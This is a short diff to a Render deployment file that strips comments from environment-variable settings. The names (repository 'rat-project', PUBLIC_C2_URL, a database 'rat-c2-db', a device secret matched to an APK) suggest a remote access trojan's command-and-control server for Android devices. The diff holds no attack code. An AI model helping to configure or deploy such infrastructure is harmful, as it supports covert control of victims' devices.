@@ -23,11 +23,11 @@ services:
       - key: ADMIN_USERNAME
         value: admin
       - key: ADMIN_PASSWORD_HASH
-        sync: false   # set manually in Render dashboard
+        sync: false
       - key: DEVICE_SECRET
-        sync: false   # set manually — must match APK
+        sync: false
       - key: GH_TOKEN
-        sync: false   # optional — only if using APK builder
+        sync: false
       - key: GH_REPO
         value: uyrer/rat-project
       - key: PUBLIC_C2_URL
@@ -37,4 +37,3 @@ databases:
   - name: rat-c2-db
     plan: free
     databaseName: rat_c2
-    
